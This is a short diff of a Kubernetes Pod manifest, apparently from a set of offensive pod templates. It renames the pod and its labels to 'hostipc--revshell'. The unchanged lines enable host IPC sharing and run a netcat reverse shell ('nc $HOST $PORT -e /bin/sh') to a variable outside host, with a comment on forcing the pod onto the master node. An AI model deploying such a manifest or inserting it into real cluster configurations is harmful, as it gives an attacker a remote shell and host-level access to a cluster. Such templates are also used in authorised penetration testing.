@@ -6,9 +6,9 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostipc
+  name: pod-hostipc--revshell
   labels:
-    app: hostipc
+    app: hostipc-revshell
 spec:
   hostIPC: true
   containers:
@@ -17,7 +17,7 @@ spec:
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
 
     imagePullPolicy: IfNotPresent
-    name: hostipc
+    name: hostipc--revshell
   # Force scheduling of your pod on master mode by uncommenting this line and changing the name
   #nodeName: k8s-master
   restartPolicy: Always
